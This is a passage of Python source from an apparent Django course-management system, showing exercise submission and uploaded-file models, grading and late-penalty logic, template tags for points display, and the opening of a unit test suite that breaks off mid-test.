submission_time = models.DateTimeField(auto_now_add=True)\n    hash = models.CharField(max_length=32, default=get_random_string)\n\n    # Relations\n    exercise = models.ForeignKey(exercise_models.BaseExercise,\n        on_delete=models.CASCADE,\n        related_name=\"submissions\")\n    submitters = models.ManyToManyField(UserProfile,\n        related_name=\"submissions\")\n    grader = models.ForeignKey(UserProfile, on_delete=models.SET_NULL,\n        related_name=\"graded_submissions\", blank=True, null=True)\n\n    # Grading and feedback\n    feedback = models.TextField(blank=True)\n    assistant_feedback = models.TextField(blank=True)\n    status = models.CharField(max_length=32,\n        choices=STATUS.choices, default=STATUS.INITIALIZED)\n    grade = models.IntegerField(default=0)\n    grading_time = models.DateTimeField(blank=True, null=True)\n    late_penalty_applied = PercentField(blank=True, null=True)\n\n    # Points received from assessment, before scaled to grade\n    service_points = models.IntegerField(default=0)\n    service_max_points = models.IntegerField(default=0)\n\n    # Additional data\n    submission_data = JSONField(blank=True)\n    grading_data = JSONField(blank=True)\n\n    objects = SubmissionManager()\n\n    class Meta:\n        app_label = 'exercise'\n        ordering = ['-id']\n\n    def __str__(self):\n        return str(self.id)\n\n    def ordinal_number(self):\n        return self.submitters.first().submissions.exclude_errors().filter(\n            exercise=self.exercise,\n            submission_time__lt=self.submission_time\n        ).count() + 1\n\n    def is_submitter(self, user):\n        return user and user.is_authenticated and \\\n            self.submitters.filter(id=user.userprofile.id).exists()\n\n    def add_files(self, files):\n        \"\"\"\n        Adds the given files to this submission as SubmittedFile objects.\n\n        @param files: a QueryDict containing files from a POST request\n        \"\"\"\n        for key in files:\n            for uploaded_file in files.getlist(key):\n                self.files.create(\n                    file_object=uploaded_file,\n                    param_name=key,\n                )\n\n    def get_post_parameters(self, request, url):\n        \"\"\"\n        Produces submission data for POST as (data_dict, files_dict).\n        \"\"\"\n        self._data = {}\n        for (key, value) in self.submission_data or {}:\n            if key in self._data:\n                self._data[key].append(value)\n            else:\n                self._data[key] = [ value ]\n\n        self._files = {}\n        for file in self.files.all().order_by(\"id\"):\n            # Requests supports only one file per name in a multipart post.\n            self._files[file.param_name] = (\n                file.filename,\n                open(file.file_object.path, \"rb\")\n            )\n\n        students = list(self.submitters.all())\n        if self.is_submitter(request.user):\n            user = request.user\n        else:\n            user = students[0].user if students else None\n        self.exercise.as_leaf_class().modify_post_parameters(\n            self._data, self._files, user, students, request, url)\n        return (self._data, self._files)\n\n    def clean_post_parameters(self):\n        for key in self._files.keys():\n            self._files[key][1].close()\n        del self._files\n        del self._data\n\n    def set_points(self, points, max_points, no_penalties=False):\n        \"\"\"\n        Sets the points and maximum points for this submissions. If the given\n        maximum points are different than the ones for the exercise this\n        submission is for, the points will be scaled.\n\n        The method also checks if the submission is late and if it is, by\n        default applies the late_submission_penalty set for the\n        exercise.course_module. If no_penalties is True, the penalty is not\n        applied.\n        \"\"\"\n        exercise = self.exercise\n\n        # Evade bad max points in remote service.\n        if max_points == 0 and points > 0:\n            max_points = exercise.max_points\n\n        # The given points must be between zero and max points\n        assert 0 <= points <= max_points\n\n        # If service max points is zero, then exercise max points must be zero\n        # too because otherwise adjusted_grade would be ambiguous.\n        # Disabled: Teacher is always responsible the exercise can be passed.\n        #assert not (max_points == 0 and self.exercise.max_points != 0)\n\n        self.service_points = points\n        self.service_max_points = max_points\n        self.late_penalty_applied = None\n\n        # Scale the given points to the maximum points for the exercise\n        if max_points > 0:\n            adjusted_grade = (1.0 * exercise.max_points * points / max_points)\n        else:\n            adjusted_grade = 0.0\n\n        if not no_penalties:\n            timing,_ = exercise.get_timing(self.submitters.all(), self.submission_time)\n            if timing in (exercise.TIMING.LATE, exercise.TIMING.CLOSED_AFTER):\n                self.late_penalty_applied = (\n                    exercise.course_module.late_submission_penalty if\n                    exercise.course_module.late_submissions_allowed else 0\n                )\n                adjusted_grade -= (adjusted_grade * self.late_penalty_applied)\n            elif timing == exercise.TIMING.UNOFFICIAL:\n                self.status = self.STATUS.UNOFFICIAL\n            if self.exercise.no_submissions_left(self.submitters.all()):\n                self.status = self.STATUS.UNOFFICIAL\n\n        self.grade = round(adjusted_grade)\n\n        # Finally check that the grade is in bounds after all the math.\n        assert 0 <= self.grade <= self.exercise.max_points\n\n    def scale_grade_to(self, percentage):\n        percentage = float(percentage)/100\n        self.grade = round(max(self.grade*percentage,0))\n        self.grade = min(self.grade,self.exercise.max_points)\n\n    def set_waiting(self):\n        self.status = self.STATUS.WAITING\n\n    def set_ready(self):\n        self.grading_time = timezone.now()\n        if self.status != self.STATUS.UNOFFICIAL:\n            self.status = self.STATUS.READY\n\n        # Fire set hooks.\n        for hook in self.exercise.course_module.course_instance \\\n                .course_hooks.filter(hook_type=\"post-grading\"):\n            hook.trigger({\n                \"submission_id\": self.id,\n                \"exercise_id\": self.exercise.id,\n                \"course_id\": self.exercise.course_module.course_instance.id,\n                \"site\": settings.BASE_URL,\n            })\n\n    def set_rejected(self):\n        self.status = self.STATUS.REJECTED\n\n    def set_error(self):\n        self.status = self.STATUS.ERROR\n\n    @property\n    def is_graded(self):\n        return self.status in (self.STATUS.READY, self.STATUS.UNOFFICIAL)\n\n    ABSOLUTE_URL_NAME = \"submission\"\n\n    def get_url_kwargs(self):\n        return dict(submission_id=self.id, **self.exercise.get_url_kwargs())\n\n    def get_inspect_url(self):\n        return self.get_url(\"submission-inspect\")\n\n\ndef build_upload_dir(instance, filename):\n    \"\"\"\n    Returns the path to a directory where a file should be saved.\n    This is called every time a new SubmittedFile model is created.\n\n    @param instance: the new SubmittedFile object\n    @param filename: the actual name of the submitted file\n    @return: a path where the file should be stored, relative to MEDIA_ROOT directory\n    \"\"\"\n    submission = instance.submission\n    exercise = submission.exercise\n    submitter_ids = [str(profile.id) for profile in submission.submitters.all().order_by(\"id\")]\n    return \"course_instance_{:d}/submissions/exercise_{:d}/users_{}/submission_{:d}/{}\".format(\n        exercise.course_instance.id,\n        exercise.id,\n        \"-\".join(submitter_ids),\n        submission.id,\n        safe_file_name(filename)\n    )\n\n\nclass SubmittedFile(UrlMixin, models.Model):\n    \"\"\"\n    Represents a file submitted by the student as a solution to an exercise.\n    Submitted files are always linked to a certain submission through a\n    foreign key relation. The files are stored on the disk while models are\n    stored in the database.\n    \"\"\"\n    PASS_MIME = ( \"image/jpeg\", \"image/png\", \"image/gif\", \"application/pdf\" )\n    submission = models.ForeignKey(Submission, on_delete=models.CASCADE,\n        related_name=\"files\")\n    param_name = models.CharField(max_length=128)\n    file_object = models.FileField(upload_to=build_upload_dir, max_length=255)\n\n    class Meta:\n        app_label = 'exercise'\n\n    @property\n    def filename(self):\n        \"\"\"\n        Returns the actual name of the file on the disk.\n        \"\"\"\n        return os.path.basename(self.file_object.path)\n\n    def get_mime(self):\n        return guess_type(self.file_object.path)[0]\n\n    def is_passed(self):\n        return self.get_mime() in SubmittedFile.PASS_MIME\n\n\n    ABSOLUTE_URL_NAME = \"submission-file\"\n\n    def get_url_kwargs(self):\n        return dict(\n            file_id=self.id,\n            file_name=self.filename,\n            **self.submission.get_url_kwargs())\n\n\ndef _delete_file(sender, instance, **kwargs):\n    \"\"\"\n    Deletes the actual submission files after the submission in database is\n    removed.\n    \"\"\"\n    default_storage.delete(instance.file_object.path)\npost_delete.connect(_delete_file, SubmittedFile)\n/n/n/nexercise/templatetags/exercise.py/n/nimport json\nfrom django import template\nfrom django.db.models import Max, Min\nfrom django.template.loader import render_to_string\nfrom django.utils import timezone\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom course.models import CourseModule\nfrom lib.errors import TagUsageError\nfrom ..cache.content import CachedContent\nfrom ..cache.points import CachedPoints\nfrom ..exercise_summary import UserExerciseSummary\nfrom ..models import LearningObjectDisplay, LearningObject, Submission, BaseExercise\n\n\nregister = template.Library()\n\n\ndef _prepare_now(context):\n    if not 'now' in context:\n        context['now'] = timezone.now()\n    return context['now']\n\n\ndef _prepare_context(context, student=None):\n    if not 'instance' in context:\n        raise TagUsageError()\n    instance = context['instance']\n    _prepare_now(context)\n    if not 'content' in context:\n        context['content'] = CachedContent(instance)\n    def points(user, key):\n        if not key in context:\n            context[key] = CachedPoints(instance, user, context['content'])\n        return context[key]\n    if student:\n        return points(student, 'studentpoints')\n    return points(context['request'].user, 'points')\n\n\ndef _get_toc(context, student=None):\n    points = _prepare_context(context, student)\n    context = context.flatten()\n    context.update({\n        'modules': points.modules_flatted(),\n        'categories': points.categories(),\n        'total': points.total(),\n        'is_course_staff': context.get('is_course_staff', False),\n    })\n    return context\n\n\n@register.inclusion_tag(\"exercise/_user_results.html\", takes_context=True)\ndef user_results(context, student=None):\n    values = _get_toc(context, student)\n    values['total_json'] = json.dumps(values['total'])\n    if student:\n        values['is_course_staff'] = False\n    return values\n\n\n@register.inclusion_tag(\"exercise/_user_toc.html\", takes_context=True)\ndef user_toc(context, student=None):\n    return _get_toc(context, student)\n\n\n@register.inclusion_tag(\"exercise/_user_last.html\", takes_context=True)\ndef user_last(context):\n    user = context['request'].user\n    points = _prepare_context(context)\n    if user.is_authenticated:\n        last = LearningObjectDisplay.objects.filter(\n            profile=user.userprofile,\n            learning_object__status=LearningObject.STATUS.READY,\n            learning_object__course_module__course_instance=context['instance'],\n        ).select_related('learning_object').order_by('-timestamp').first()\n        if last:\n            entry,_,_,_ = points.find(last.learning_object)\n            return {\n                'last': entry,\n                'last_time': last.timestamp,\n            }\n    return {\n        'begin': points.begin(),\n        'instance': context['instance'],\n    }\n\n\n@register.inclusion_tag(\"exercise/_category_points.html\", takes_context=True)\ndef category_points(context, student=None):\n    return _get_toc(context, student)\n\n\n@register.inclusion_tag(\"exercise/_submission_list.html\", takes_context=True)\ndef latest_submissions(context):\n    submissions = context[\"profile\"].submissions \\\n        .filter(exercise__course_module__course_instance=context[\"instance\"]) \\\n        .order_by(\"-id\")[:10]\n    return {\n        \"submissions\": submissions,\n        \"title\": _(\"Latest submissions\"),\n        \"empty\": _(\"No submissions for this course.\"),\n    }\n\n\n@register.filter\ndef max_submissions(exercise, user_profile):\n    return exercise.max_submissions_for_student(user_profile)\n\n\n@register.filter\ndef percent(decimal):\n    return int(decimal * 100)\n\n\n@register.filter\ndef submission_status(status):\n    return Submission.STATUS[status]\n\n\ndef _points_data(obj, classes=None):\n    if isinstance(obj, UserExerciseSummary):\n        exercise = obj.exercise\n        data = {\n            'points': obj.get_points(),\n            'max': exercise.max_points,\n            'difficulty': exercise.difficulty,\n            'required': exercise.points_to_pass,\n            'confirm_the_level': exercise.category.confirm_the_level,\n            'missing_points': obj.is_missing_points(),\n            'passed': obj.is_passed(),\n            'full_score': obj.is_full_points(),\n            'submitted': obj.is_submitted(),\n            'graded': obj.is_graded(),\n            'official': not obj.is_unofficial(),\n            'exercise_page': True,\n        }\n    elif isinstance(obj, Submission):\n        exercise = obj.exercise\n        data = {\n            'points': obj.grade,\n            'max': exercise.max_points,\n            'difficulty': exercise.difficulty,\n            'required': exercise.points_to_pass,\n            'confirm_the_level': exercise.category.confirm_the_level,\n            'missing_points': obj.grade < exercise.points_to_pass,\n            'passed': obj.grade >= exercise.points_to_pass,\n            'full_score': obj.grade >= exercise.max_points,\n            'submitted': True,\n            'graded': obj.is_graded,\n            'official': obj.status != Submission.STATUS.UNOFFICIAL,\n        }\n        if not obj.is_graded and (\n                    not exercise.category.confirm_the_level\n                    or obj.status != Submission.STATUS.WAITING\n                ):\n            data['status'] = obj.status\n    else:\n        points = obj.get('points', 0)\n        max_points = obj.get('max_points', 0)\n        required = obj.get('points_to_pass', 0)\n        data = {\n            'points': points,\n            'max': max_points,\n            'difficulty': obj.get('difficulty', ''),\n            'required': required,\n            'confirm_the_level': obj.get('confirm_the_level', False),\n            'missing_points': points < required,\n            'passed': obj.get('passed', True),\n            'full_score': points >= max_points,\n            'submitted': obj.get('submission_count', 0) > 0,\n            'graded': obj.get('graded', True),\n            'status': obj.get('submission_status', False),\n            'unconfirmed': obj.get('unconfirmed', False),\n            'official': not obj.get('unofficial', False),\n            'confirmable_points': obj.get('confirmable_points', False),\n        }\n    percentage = 0\n    required_percentage = None\n    if data['max'] > 0:\n        percentage = int(round(100.0 * data['points'] / data['max']))\n        if data['required']:\n            required_percentage = int(round(100.0 * data['required'] / data['max']))\n    data.update({\n        'classes': classes,\n        'percentage': percentage,\n        'required_percentage': required_percentage,\n    })\n    return data\n\n\n@register.inclusion_tag(\"exercise/_points_progress.html\")\ndef points_progress(obj):\n    return _points_data(obj)\n\n\n@register.inclusion_tag(\"exercise/_points_badge.html\")\ndef points_badge(obj, classes=None):\n    return _points_data(obj, classes)\n\n\n@register.assignment_tag(takes_context=True)\ndef max_group_size(context):\n    points = _prepare_context(context)\n    return points.total()['max_group_size']\n\n\n@register.assignment_tag(takes_context=True)\ndef min_group_size(context):\n    points = _prepare_context(context)\n    return points.total()['min_group_size']\n\n\n@register.assignment_tag(takes_context=True)\ndef module_accessible(context, entry):\n    t = entry.get('opening_time')\n    if t and t > _prepare_now(context):\n        return False\n    if entry.get('requirements'):\n        points = _prepare_context(context)\n        module = CourseModule.objects.get(id=entry['id'])\n        return module.are_requirements_passed(points)\n    return True\n\n\n@register.assignment_tag\ndef get_grading_errors(submission):\n    if not isinstance(submission.grading_data, dict):\n        return \"\"\n    grading_data = submission.grading_data.get('grading_data')\n    if not isinstance(grading_data, str):\n        return \"\"\n    if grading_data.startswith('<pre>'):\n        return grading_data[5:-6]\n    try:\n        return json.loads(grading_data).get('errors', \"\")\n    except (AttributeError, TypeError, ValueError):\n        return \"\"\n\n\n@register.inclusion_tag(\"exercise/_text_stats.html\", takes_context=True)\ndef exercise_text_stats(context, exercise):\n    if not 'instance' in context:\n        raise TagUsageError()\n    instance = context['instance']\n\n    if not 'student_count' in context:\n        context['student_count'] = instance.students.count()\n    total = context['student_count']\n\n    if isinstance(exercise, int):\n        num = instance.students.filter(submissions__exercise_id=exercise).distinct().count()\n    else:\n        num = exercise.number_of_submitters() if exercise else 0\n    return {\n        \"number\": num,\n        \"percentage\": int(100 * num / total) if total else 0,\n    }\n\n@register.simple_tag\ndef get_format_info(format):\n    format_infos = {\n        'json' : {\n            'name': 'json',\n            'verbose_name': 'JSON',\n        },\n        'csv': {\n            'name': 'csv',\n            'verbose_name': 'CSV',\n        },\n        'excel.csv': {\n            'name': 'excel.csv',\n            'verbose_name': _('Excel compatible CSV'),\n        },\n    }\n    try:\n        return format_infos[format]\n    except KeyError as e:\n        raise RuntimeError('Invalid format: \\'{}\\''.format(format)) from e\n\n@register.simple_tag\ndef get_format_info_list(formats):\n    return [get_format_info(format) for format in formats.split()]\n/n/n/nexercise/tests.py/n/nfrom datetime import datetime, timedelta\nimport json\nimport os.path\nimport urllib\n\nfrom django.conf import settings\nfrom django.contrib.auth.models import User\nfrom django.core.exceptions import ValidationError\nfrom django.urls import reverse\nfrom django.test import TestCase\nfrom django.test.client import RequestFactory\nfrom django.utils import timezone\nfrom django.utils.datastructures import MultiValueDict\n\nfrom course.models import Course, CourseInstance, CourseHook, CourseModule, \\\n    LearningObjectCategory\nfrom deviations.models import DeadlineRuleDeviation, \\\n    MaxSubmissionsRuleDeviation\nfrom exercise.exercise_summary import UserExerciseSummary\nfrom exercise.models import BaseExercise, StaticExercise, \\\n    ExerciseWithAttachment, Submission, SubmittedFile, LearningObject\nfrom exercise.protocol.exercise_page import ExercisePage\n\n\nclass ExerciseTest(TestCase):\n    def setUp(self):\n        self.user = User(username=\"testUser\", first_name=\"First\", last_name=\"Last\")\n        self.user.set_password(\"testPassword\")\n        self.user.save()\n\n        self.grader = User(username=\"grader\")\n        self.grader.set_password(\"graderPassword\")\n        self.grader.save()\n\n        self.teacher = User(username=\"staff\", is_staff=True)\n        self.teacher.set_password(\"staffPassword\")\n        self.teacher.save()\n\n        self.user2 = User(username=\"testUser2\", first_name=\"Strange\", last_name=\"Fellow\")\n        self.user2.set_password(\"testPassword2\")\n        self.user2.save()\n\n        self.course = Course.objects.create(\n            name=\"test course\",\n            code=\"123456\",\n            url=\"Course-Url\"\n        )\n        self.course.teachers.add(self.teacher.userprofile)\n\n        self.today = timezone.now()\n        self.yesterday = self.today - timedelta(days=1)\n        self.tomorrow = self.today + timedelta(days=1)\n        self.two_days_from_now = self.tomorrow + timedelta(days=1)\n        self.three_days_from_now = self.two_days_from_now + timedelta(days=1)\n\n        self.course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 1\",\n            starting_time=self.today,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"T-00.1000_d1\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n        )\n        self.course_instance.assistants.add(self.grader.userprofile)\n\n        self.course_module = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module\",\n            points_to_pass=15,\n            course_instance=self.course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow\n        )\n\n        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module-late\",\n            points_to_pass=50,\n            course_instance=self.course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.two_days_from_now,\n            late_submission_penalty=0.2\n        )\n\n        self.old_course_module = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module-old\",\n            points_to_pass=15,\n            course_instance=self.course_instance,\n            opening_time=self.yesterday,\n            closing_time=self.today\n        )\n\n        self.learning_object_category = LearningObjectCategory.objects.create(\n            name=\"test category\",\n            course_instance=self.course_instance,\n            points_to_pass=5\n        )\n\n        self.hidden_learning_object_category = LearningObjectCategory.objects.create(\n            name=\"hidden category\",\n            course_instance=self.course_instance\n        )\n        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)\n\n        self.learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"l1\",\n        )\n\n        self.broken_learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module_with_late_submissions_allowed,\n            category=self.learning_object_category,\n            url=\"l2\",\n        )\n\n        self.base_exercise = BaseExercise.objects.create(\n            order=1,\n            name=\"test exercise\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"b1\",\n            max_submissions=1,\n        )\n\n        self.static_exercise = StaticExercise.objects.create(\n            order=2,\n            name=\"test exercise 2\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"s2\",\n            max_points=50,\n            points_to_pass=50,\n            service_url=\"/testServiceURL\",\n            exercise_page_content=\"test_page_content\",\n            submission_page_content=\"test_submission_content\"\n        )\n\n        self.exercise_with_attachment = ExerciseWithAttachment.objects.create(\n            order=3,\n            name=\"test exercise 3\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"a1\",\n            max_points=50,\n            points_to_pass=50,\n            max_submissions=0,\n            files_to_submit=\"test1.txt|test2.txt|img.png\",\n            content=\"test_instructions\"\n        )\n\n        self.old_base_exercise = BaseExercise.objects.create(\n            name=\"test exercise\",\n            course_module=self.old_course_module,\n            category=self.learning_object_category,\n            url=\"b2\",\n            max_submissions=1\n        )\n\n        self.base_exercise_with_late_submission_allowed = BaseExercise.objects.create(\n            name=\"test exercise with late submissions allowed\",\n            course_module=self.course_module_with_late_submissions_allowed,\n            category=self.learning_object_category,\n            url=\"b3\",\n        )\n\n        self.submission = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.submission.submitters.add(self.user.userprofile)\n\n        self.submission_with_two_submitters = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.submission_with_two_submitters.submitters.add(self.user.userprofile)\n        self.submission_with_two_submitters.submitters.add(self.user2.userprofile)\n\n        self.late_submission = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.late_submission.submission_time = self.two_days_from_now\n        self.late_submission.submitters.add(self.user.userprofile)\n\n        self.submission_when_late_allowed = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        self.submission_when_late_allowed.submitters.add(self.user.userprofile)\n\n        self.late_submission_when_late_allowed = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        self.late_submission_when_late_allowed.submission_time = self.two_days_from_now\n        self.late_submission_when_late_allowed.submitters.add(self.user.userprofile)\n\n        self.late_late_submission_when_late_allowed = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        self.late_late_submission_when_late_allowed.submission_time = self.three_days_from_now\n        self.late_late_submission_when_late_allowed.submitters.add(self.user.userprofile)\n\n        self.course_hook = CourseHook.objects.create(\n            hook_url=\"http://localhost/test_hook_url\",\n            course_instance=self.course_instance\n        )\n\n        self.deadline_rule_deviation = DeadlineRuleDeviation.objects.create(\n            exercise=self.exercise_with_attachment,\n            submitter=self.user.userprofile,\n            extra_minutes=1440  # One day\n        )\n\n    def test_learning_object_category_unicode_string(self):\n        self.assertEqual(\"test category\", str(self.learning_object_category))\n        self.assertEqual(\"hidden category\", str(self.hidden_learning_object_category))\n\n    #def test_learning_object_category_hiding(self):\n    #    self.assertFalse(self.learning_object_category.is_hidden_to(self.user.userprofile))\n    #    self.assertFalse(self.learning_object_category.is_hidden_to(self.grader.userprofile))\n    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))\n    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))\n\n    #    self.hidden_learning_object_category.set_hidden_to(self.user.userprofile, False)\n    #    self.hidden_learning_object_category.set_hidden_to(self.grader.userprofile)\n\n    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))\n    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))\n\n    #    self.hidden_learning_object_category.set_hidden_to(self.user.userprofile, True)\n    #    self.hidden_learning_object_category.set_hidden_to(self.grader.userprofile, False)\n\n    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))\n    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))\n\n    def test_learning_object_clean(self):\n        try:\n            self.learning_object.clean()\n        except ValidationError:\n            self.fail()\n        self.assertRaises(ValidationError, self.broken_learning_object.clean())\n\n    def test_learning_object_course_instance(self):\n        self.assertEqual(self.course_instance, self.learning_object.course_instance)\n        self.assertEqual(self.course_instance, self.broken_learning_object.course_instance)\n\n    def test_base_exercise_one_has_submissions(self):\n        self.assertFalse(self.base_exercise.one_has_submissions([self.user.userprofile])[0])\n        self.assertTrue(self.static_exercise.one_has_submissions([self.user.userprofile])[0])\n        self.assertTrue(self.exercise_with_attachment.one_has_submissions([self.user.userprofile])[0])\n        self.submission.set_error()\n        self.submission.save()\n        self.submission_with_two_submitters.set_error()\n        self.submission_with_two_submitters.save()\n        self.late_submission.set_error()\n        self.late_submission.save()\n        self.assertTrue(self.base_exercise.one_has_submissions([self.user.userprofile])[0])\n\n    def test_base_exercise_max_submissions(self):\n        self.assertEqual(1, self.base_exercise.max_submissions_for_student(self.user.userprofile))\n        self.assertEqual(10, self.static_exercise.max_submissions_for_student(self.user.userprofile))\n        self.assertEqual(0, self.exercise_with_attachment.max_submissions_for_student(self.user.userprofile))\n\n    def test_base_exercise_submissions_for_student(self):\n        self.assertEqual(3, len(self.base_exercise.get_submissions_for_student(self.user.userprofile)))\n        self.assertEqual(0, len(self.static_exercise.get_submissions_for_student(self.user.userprofile)))\n        self.assertEqual(0, len(self.exercise_with_attachment.get_submissions_for_student(self.user.userprofile)))\n        self.submission.set_error()\n        self.submission.save()\n        self.assertEqual(3, len(self.base_exercise.get_submissions_for_student(self.user.userprofile)))\n        self.assertEqual(2, len(self.base_exercise.get_submissions_for_student(self.user.userprofile, True)))\n\n    def test_base_exercise_is_open(self):\n        self.assertTrue(self.base_exercise.is_open())\n        self.assertTrue(self.static_exercise.is_open())\n        self.assertTrue(self.exercise_with_attachment.is_open())\n        self.assertFalse(self.old_base_exercise.is_open())\n        self.assertFalse(self.base_exercise.is_open(self.yesterday))\n        self.assertFalse(self.static_exercise.is_open(self.yesterday))\n        self.assertFalse(self.exercise_with_attachment.is_open(self.yesterday))\n        self.assertTrue(self.old_base_exercise.is_open(self.yesterday))\n        self.assertTrue(self.base_exercise.is_open(self.tomorrow))\n        self.assertTrue(self.static_exercise.is_open(self.tomorrow))\n        self.assertTrue(self.exercise_with_attachment.is_open(self.tomorrow))\n        self.assertFalse(self.old_base_exercise.is_open(self.tomorrow))\n\n    def test_base_exercise_one_has_access(self):\n        self.assertTrue(self.base_exercise.one_has_access([self.user.userprofile])[0])\n        self.assertTrue(self.static_exercise.one_has_access([self.user.userprofile])[0])\n        self.assertTrue(self.exercise_with_attachment.one_has_access([self.user.userprofile])[0])\n        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile])[0])\n        self.assertFalse(self.base_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])\n        self.assertFalse(self.static_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])\n        self.assertFalse(self.exercise_with_attachment.one_has_access([self.user.userprofile], self.yesterday)[0])\n        self.assertTrue(self.old_base_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])\n        self.assertTrue(self.base_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])\n        self.assertTrue(self.static_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])\n        self.assertTrue(self.exercise_with_attachment.one_has_access([self.user.userprofile], self.tomorrow)[0])\n        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])\n\n    def test_base_exercise_submission_allowed(self):\n        status, errors, students = (\n            self.base_exercise.check_submission_allowed(self.user.userprofile))\n        self.assertNotEqual(status, self.base_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(len(errors), 1)\n        json.dumps(errors)\n        self.assertNotEqual(\n            self.static_exercise.check_submission_allowed(self.user.userprofile)[0],\n            self.static_exercise.SUBMIT_STATUS.ALLOWED)\n        self.course_instance.enroll_student(self.user)\n        self.assertEqual(\n            self.static_exercise.check_submission_allowed(self.user.userprofile)[0],\n            self.static_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(\n            self.exercise_with_attachment.check_submission_allowed(self.user.userprofile)[0],\n            self.static_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertNotEqual(\n            self.old_base_exercise.check_submission_allowed(self.user.userprofile)[0],\n            self.old_base_exercise.SUBMIT_STATUS.ALLOWED)\n\n        self.assertEqual(\n            self.base_exercise.check_submission_allowed(self.grader.userprofile)[0],\n            self.base_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(\n            self.static_exercise.check_submission_allowed(self.grader.userprofile)[0],\n            self.static_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(\n            self.exercise_with_attachment \\\n                .check_submission_allowed(self.grader.userprofile)[0],\n            self.exercise_with_attachment.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(\n            self.old_base_exercise.check_submission_allowed(self.grader.userprofile)[0],\n            self.old_base_exercise.SUBMIT_STATUS.ALLOWED)\n\n    def test_base_exercise_submission_deviation(self):\n        self.assertFalse(self.base_exercise.one_has_submissions([self.user.userprofile])[0])\n        deviation = MaxSubmissionsRuleDeviation.objects.create(\n            exercise=self.base_exercise,\n            submitter=self.user.userprofile,\n            extra_submissions=3\n        )\n        self.assertTrue(self.base_exercise.one_has_submissions([self.user.userprofile])[0])\n\n    def test_base_exercise_deadline_deviation(self):\n        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile])[0])\n        deviation = DeadlineRuleDeviation.objects.create(\n            exercise=self.old_base_exercise,\n            submitter=self.user.userprofile,\n            extra_minutes=10*24*60\n        )\n        self.assertTrue(self.old_base_exercise.one_has_access([self.user.userprofile])[0])\n\n    def test_base_exercise_total_submission_count(self):\n        self.assertEqual(self.base_exercise.get_total_submitter_count(), 2)\n        self.assertEqual(self.static_exercise.get_total_submitter_count(), 0)\n        self.assertEqual(self.exercise_with_attachment.get_total_submitter_count(), 0)\n\n    def test_base_exercise_unicode_string(self):\n        self.assertEqual(\"1.1 test exercise\", str(self.base_exercise))\n        self.assertEqual(\"1.2 test exercise 2\", str(self.static_exercise))\n        self.assertEqual(\"1.3 test exercise 3\", str(self.exercise_with_attachment))\n\n    def test_base_exercise_absolute_url(self):\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/b1/\", self.base_exercise.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/s2/\", self.static_exercise.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/a1/\", self.exercise_with_attachment.get_absolute_url())\n\n    def test_base_exercise_async_url(self):\n        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')\n        language = 'en'\n        # the order of the parameters in the returned service url is non-deterministic, so we check the parameters separately\n        split_base_exercise_service_url = self.base_exercise._build_service_url(language, request, [self.user.userprofile], 1, 'exercise', 'service').split(\"?\")\n        split_static_exercise_service_url = self.static_exercise._build_service_url(language, request, [self.user.userprofile], 1, 'exercise', 'service').split(\"?\")\n        self.assertEqual(\"\", split_base_exercise_service_url[0])\n        self.assertEqual(\"/testServiceURL\", split_static_exercise_service_url[0])\n        # a quick hack to check whether the parameters are URL encoded\n        self.assertFalse(\"/\" in split_base_exercise_service_url[1] or \":\" in split_base_exercise_service_url[1])\n        self.assertFalse(\"/\" in split_static_exercise_service_url[1] or \":\" in split_static_exercise_service_url[1])\n        # create dictionaries from the parameters and check each value. Note: parse_qs changes encoding back to regular utf-8\n        